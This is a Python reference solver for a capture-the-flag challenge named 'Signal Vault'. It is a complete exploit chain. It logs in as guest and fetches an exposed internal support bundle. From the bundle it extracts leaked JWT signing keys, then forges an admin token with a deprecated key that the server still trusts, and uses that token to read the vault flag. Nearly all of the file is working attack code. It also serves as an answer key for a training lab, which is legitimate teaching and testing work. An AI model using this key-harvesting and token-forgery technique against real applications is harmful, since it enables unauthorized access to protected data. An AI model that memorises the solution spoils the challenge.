#!/usr/bin/env python3
"""
Reference solver for the Signal Vault CTF challenge.

Standard library only -- no requests, no PyJWT -- so it runs on any laptop
with Python 3.8+ and no internet access.

    python3 solve.py                       # against http://127.0.0.1:8080
    python3 solve.py http://192.168.1.42:8080
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

TIMEOUT = 10


# --------------------------------------------------------------------------- #
# Tiny HTTP helper with manual cookie handling
# --------------------------------------------------------------------------- #


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    """Keep 3xx responses -- the session cookie is set on the login redirect."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class Session:
    def __init__(self, base: str) -> None:
        self.base = base.rstrip("/")
        self.cookies: dict[str, str] = {}
        self.opener = urllib.request.build_opener(_NoRedirect)

    def request(self, path: str, data: dict | None = None) -> tuple[int, str]:
        url = f"{self.base}{path}"
        body = urllib.parse.urlencode(data).encode() if data else None
        req = urllib.request.Request(url, data=body, method="POST" if data else "GET")
        req.add_header("User-Agent", "signal-vault-solver/1.0")
        if self.cookies:
            req.add_header(
                "Cookie", "; ".join(f"{k}={v}" for k, v in self.cookies.items())
            )
        try:
            with self.opener.open(req, timeout=TIMEOUT) as resp:
                self._store_cookies(resp)
                return resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as err:
            self._store_cookies(err)
            return err.code, err.read().decode("utf-8", "replace")

    def _store_cookies(self, resp) -> None:
        for header in resp.headers.get_all("Set-Cookie") or []:
            name, _, rest = header.partition("=")
            self.cookies[name.strip()] = rest.split(";")[0].strip()


# --------------------------------------------------------------------------- #
# JWT helpers
# --------------------------------------------------------------------------- #


def b64url_decode(segment: str) -> bytes:
    return base64.urlsafe_b64decode(segment + "=" * (-len(segment) % 4))


def b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")


def decode_unverified(token: str) -> tuple[dict, dict]:
    header, payload, _ = token.split(".")
    return json.loads(b64url_decode(header)), json.loads(b64url_decode(payload))


def forge(claims: dict, key: str, kid: str) -> str:
    header = {"alg": "HS256", "typ": "JWT", "kid": kid}
    dump = lambda obj: json.dumps(obj, separators=(",", ":"), sort_keys=True).encode()
    signing_input = f"{b64url_encode(dump(header))}.{b64url_encode(dump(claims))}"
    signature = hmac.new(
        key.encode(), signing_input.encode("ascii"), hashlib.sha256
    ).digest()
    return f"{signing_input}.{b64url_encode(signature)}"


# --------------------------------------------------------------------------- #
# Exploit chain
# --------------------------------------------------------------------------- #


def main(base: str) -> int:
    session = Session(base)
    print(f"[*] target {base}")

    # 1. Authenticate with the published analyst account.
    status, _ = session.request("/login", {"username": "guest", "password": "guest"})
    token = session.cookies.get("sv_session")
    if not token:
        print(f"[!] login failed (HTTP {status}) -- is the target up?")
        return 1
    header, claims = decode_unverified(token)
    print(f"[+] logged in as guest")
    print(f"[+] token header  {header}")
    print(f"[+] token claims  role={claims['role']} clearance={claims['clearance']}")

    # 2. Confirm the vault is closed to this role.
    status, _ = session.request("/vault")
    print(f"[+] /vault as analyst -> HTTP {status} (expected 403)")

    # 3. Pull the forgotten diagnostics export and recover the key inventory.
    status, body = session.request("/internal/support-bundle")
    if status != 200:
        print(f"[!] support bundle unreachable (HTTP {status})")
        return 1
    bundle = json.loads(base64.b64decode(json.loads(body)["bundle"]))
    inventory = {
        entry["kid"]: entry["material"] for entry in bundle["key_inventory"]
    }
    print("[+] key inventory recovered:")
    for kid, material in inventory.items():
        print(f"      kid={kid:<12} material={material}")

    legacy = next(
        (entry for entry in bundle["key_inventory"]
         if entry["status"] == "deprecated" and "withheld" not in entry["material"]),
        None,
    )
    if legacy is None:
        print("[!] no usable key in the inventory")
        return 1
    print(f"[+] usable signing key: kid={legacy['kid']!r} key={legacy['material']!r}")

    # 4. Forge an admin token signed with the deprecated-but-trusted key.
    now = int(time.time())
    forged_claims = {
        "sub": "guest",
        "role": "admin",
        "clearance": "VAULT",
        "display": "Guest Analyst",
        "iat": now,
        "exp": now + 3600,
    }
    forged = forge(forged_claims, legacy["material"], legacy["kid"])
    session.cookies["sv_session"] = forged
    print(f"[+] forged token: {forged[:48]}...")

    # 5. Collect the flag.
    status, body = session.request("/vault")
    if status != 200:
        print(f"[!] vault still closed (HTTP {status})")
        return 1

    match = re.search(r"(CTF\{[^}]{1,200}\})", body)
    if not match:
        print("[!] vault reached but no flag pattern found")
        return 1

    print(f"[+] /vault as forged admin -> HTTP {status}")
    print(f"\n    FLAG: {match.group(1)}\n")
    return 0


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"
    raise SystemExit(main(target))
